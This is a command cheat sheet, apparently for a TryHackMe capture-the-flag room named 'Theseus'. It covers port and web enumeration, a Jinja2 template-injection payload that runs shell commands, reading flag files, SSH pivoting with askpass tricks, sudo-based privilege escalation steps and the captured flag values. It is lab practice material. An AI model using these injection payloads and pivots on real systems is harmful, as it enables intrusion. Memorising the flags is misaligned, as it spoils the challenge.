---
tags: cmd, checklist, thm
room: Theseus
os: linux
ip: 10.66.144.79
---

# Theseus 命令速查

## Recon

### 端口与服务
```bash
nmap -Pn --top-ports 1000 -T4 10.66.144.79 -oN /tmp/thm_top1000.txt
nmap -Pn -sC -sV -p22,8080 10.66.144.79 -oN /tmp/thm_sv.txt
nmap -Pn -p8080 --script http-enum,http-methods 10.66.144.79 -oN /tmp/thm_http_enum.txt
```

### Web 枚举
```bash
curl -i -s --max-time 10 http://10.66.144.79:8080/ | head -n 40
gobuster dir -q -u http://10.66.144.79:8080 -w /usr/share/wordlists/dirb/common.txt -t 20 -k
ffuf -u 'http://10.66.144.79:8080/?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1247 -mc all -t 40
```

## Vulnerability Identification

### SSTI 验证
```bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{7*7}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{config.items()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("id").read()}}'
```

### minos 枚举与取证
```bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("whoami;id;hostname;uname -a").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("ls -la /home/minos").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("cat /home/minos/Minos_Flag").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("cat /home/minos/Crete_Shores").read()}}'
```

## Privilege Escalation

### minos
```bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("sudo -l 2>/dev/null").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("ifconfig -a").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("sudo nmap -sn 10.71.235.0/24").read()}}'
sudo nmap -Pn --top-ports 1000 -T4 10.71.235.37
sudo nmap -Pn --top-ports 1000 -T4 10.71.235.159
```

### entrance -> Labyrinth
```bash
DISPLAY=dummy SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force setsid ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no entrance@10.71.235.159 whoami < /dev/null
ssh -i ~/.ssh/theseus_pivot minos@10.66.144.79 whoami
ssh -i ~/.ssh/theseus_pivot -o ProxyCommand='ssh -i ~/.ssh/theseus_pivot -W %h:%p minos@10.66.144.79' entrance@10.71.235.159 whoami
sudo -l
ls -la /home
find /home -maxdepth 2 -type f 2>/dev/null | sort
```

### entrance -> minotaur
```bash
id
whoami
cat /home/minotaur/Labyrinth_Flag
sudo -l
```

### minotaur -> ariadne
```bash
cd /home/minotaur
python3 -c "import base64,sys;sys.stdout.buffer.write(base64.b64decode('<payload_b64>'))" | sudo -u ariadne ./thread
su ariadne
cat /home/ariadne/Minotaur_Flag
cat /home/ariadne/TheReturn
```

### ariadne -> shore
```bash
file /home/ariadne/ariadne
strings -n 8 /home/ariadne/ariadne | head -n 20
xxd -l 96 /home/ariadne/ariadne
```

## Post Exploitation

### Athens
```bash
DISPLAY=dummy SSH_ASKPASS=/tmp/ap2.sh SSH_ASKPASS_REQUIRE=force setsid ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o StrictHostKeyChecking=no shore@10.71.235.37 whoami < /dev/null
cat /home/shore/Athens_flag
cat /home/shore/BlackSails
```

## Result

### Flags
```text
Minos_Flag     : THM{499a89a2a064426921732e7d31bc08a}
Labyrinth_Flag : THM{6154ea526254375613650183962bf431}
Minotaur_Flag  : THM{c307b8045208fac06b9faa90e68d2ad4}
Athens_flag    : THM{bb2af471e0aea04e982c2e5d0a6fa404}
```

## Conclusion

- Web 入口的核心是隐藏参数 key 对应的 Jinja2 SSTI。
- 主机链路是 minos -> entrance -> minotaur -> ariadne -> shore。
- 关键提权点分别是 sudo nmap 内网发现、labyrinth 栈溢出、thread 格式化字符串、修复图片拿到 Athens 凭据。
